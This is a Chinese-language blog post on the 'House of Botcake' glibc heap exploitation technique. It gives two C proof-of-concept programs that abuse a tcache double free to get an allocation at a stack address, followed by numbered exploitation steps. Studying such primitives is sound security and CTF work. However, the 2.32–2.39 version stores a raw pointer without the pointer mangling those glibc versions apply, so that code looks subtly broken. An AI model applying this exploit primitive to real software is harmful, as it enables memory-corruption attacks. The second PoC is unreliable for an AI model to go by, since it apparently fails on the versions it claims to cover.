---
title: "House of系列"
date: 2025-05-21
---

# house of botcake

### 介绍

House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。

### POC

#### glibc 2.27 - 2.31

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
    intptr_t stack_var[4];
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);

    free(a);// a is already freed
  
 
    intptr_t *b = malloc(0x120);
    b[0x120/8-2] = (long)stack_var;

    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");

    return 0;
}
```

#### glibc 2.32--2.39

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>


int main()
{
    
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);


    // prepare the target
    intptr_t stack_var[4];

    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    

    for(int i=0; i<7; i++){
        free(x[i]);
    }

    free(a);

    free(prev);

    malloc(0x100);
    free(a);// a is already freed
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;
    
    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);

    return 0;
}
```

### 利用思路

1. 申请7个0x100大小的chunk
2. 在申请大小为0x100的chunk1 ，chunk2 
3. free 7个chunk填充tcache
4. free chunk2,chunk1 ，使其进入unsorted bin，并因为连续所以合并。
5. malloc 0x100，从tache里取出一个free chunk
6. free chunk2 使其进入 tache bin，这样tache bin中就有了unsorted bin中的一块小内存
7. malloc 0x120 从 unsorted bin中分割出来一块内存，可覆盖chunk2的next指针
8. 伪造next指针

